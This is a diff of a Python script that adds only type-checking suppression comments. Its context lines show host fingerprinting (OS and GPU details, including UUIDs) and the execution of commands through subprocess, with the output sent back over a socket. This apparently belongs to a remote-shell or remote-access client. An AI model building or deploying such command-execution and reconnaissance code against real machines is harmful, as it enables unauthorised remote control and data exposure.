@@ -51,15 +51,15 @@ while is_running:
             GPU_list = []
             for gpu in GPUtil.getGPUs():
                 gpu_data = {
-                'ID': f'{gpu.id}',
-                'Name': f'{gpu.name}',
-                'Memory': f'{gpu.memoryTotal - gpu.memoryFree} / {gpu.memoryTotal} MB',
-                'Load': f'{gpu.load}%',
-                'Temp': f'{gpu.temperature} C',
-                'UUID': f'{gpu.uuid}',
-                'Driver': f'{gpu.driver}'
+                'ID': f'{gpu.id}', # type: ignore
+                'Name': f'{gpu.name}', # type: ignore
+                'Memory': f'{gpu.memoryTotal - gpu.memoryFree} / {gpu.memoryTotal} MB', # type: ignore
+                'Load': f'{gpu.load}%', # type: ignore
+                'Temp': f'{gpu.temperature} C', # type: ignore
+                'UUID': f'{gpu.uuid}',  # type: ignore
+                'Driver': f'{gpu.driver}'   # type: ignore
                 }
-                GPU_list.append(gpu_data)
+                GPU_list.append(gpu_data)   # type: ignore
                 
             sysinfo = f"""
             OS: {platform.system()}
@@ -80,7 +80,7 @@ while is_running:
                 else:
                     sysinfo += 'GPUs:\n'
                 for gpu in GPU_list:
-                    for key, value in gpu.items():
+                    for key, value in gpu.items(): # type: ignore
                         sysinfo += f'\t\t{key}: {value}\n'
                     sysinfo += '\n'
                         
@@ -103,7 +103,7 @@ while is_running:
                                     stdout=subprocess.PIPE,
                                     stdin=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
-            STDOUT, STDERR = comm.communicate()
+            STDOUT, STDERR = comm.communicate() # type: ignore
             if not STDOUT:
                 sock.send(STDERR)
             else:
